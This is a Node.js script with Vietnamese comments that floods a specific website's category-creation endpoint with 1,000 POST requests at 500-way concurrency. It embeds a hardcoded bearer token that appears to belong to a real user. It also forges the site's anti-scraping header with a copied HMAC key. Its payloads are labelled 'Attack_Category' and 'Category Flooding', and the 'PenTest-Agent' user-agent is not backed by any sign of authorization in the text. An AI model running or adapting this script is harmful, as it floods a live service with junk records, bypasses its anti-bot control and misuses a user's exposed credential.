const crypto = require('crypto');

// Cấu hình từ dữ liệu bạn cung cấp
const TARGET_URL = "https://luyentu.com/categories";
const AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjU0NjMzLCJlbWFpbCI6ImJ1aWRpbmhxdW9jMjAwNUBnbWFpbC5jb20iLCJpYXQiOjE3NzU3OTk5MjgsImV4cCI6MTc3NTgwMDgyOH0.i2-Xj8jVkqm-E-YFX1VU7lMoI7H-mJX-AnoI2a3pmaI";
const ANTI_SCRAPE_KEY = "luyentu-anti-scrape-2026"; 

const CONCURRENCY = 500; 
const TOTAL_ATTEMPTS = 1000; 

function generateAppToken() {
    const timestamp = Date.now().toString();
    const hash = crypto.createHmac('sha256', ANTI_SCRAPE_KEY)
                       .update(timestamp)
                       .digest('hex')
                       .substring(0, 16);
    return `${timestamp}.${hash}`;
}

async function sendRequest(id) {
    const payload = {
        name: `Attack_Category_${id}_${crypto.randomBytes(3).toString('hex')}`,
        description: "Automated security testing - Category Flooding",
        icon: "fas fa-book"
    };

    const start = Date.now();
    try {
        const res = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'authorization': AUTH_TOKEN,
                'x-app-token': generateAppToken(),
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) PenTest-Agent/1.0'
            },
            body: JSON.stringify(payload)
        });

        const duration = Date.now() - start;
        return { status: res.status, time: duration };
    } catch (e) {
        return { status: "CONNECTION_FAILURE (502/Timeout)", time: Date.now() - start };
    }
}

async function startStressTest() {
    console.log(`[!] Khởi động kiểm thử tấn công tạo Row hàng loạt...`);
    let active = 0;
    let completed = 0;

    const execute = async () => {
        if (completed >= TOTAL_ATTEMPTS) return;
        
        const currentId = completed++;
        active++;
        
        const result = await sendRequest(currentId);
        
        if (currentId % 10 === 0) {
            console.log(`[${currentId}] Status: ${result.status} | Delay: ${result.time}ms`);
        }
        
        active--;
        execute(); // Đệ quy để duy trì độ song song
    };

    // Khởi tạo số luồng song song theo CONCURRENCY
    for (let i = 0; i < CONCURRENCY; i++) {
        execute();
    }
}

startStressTest();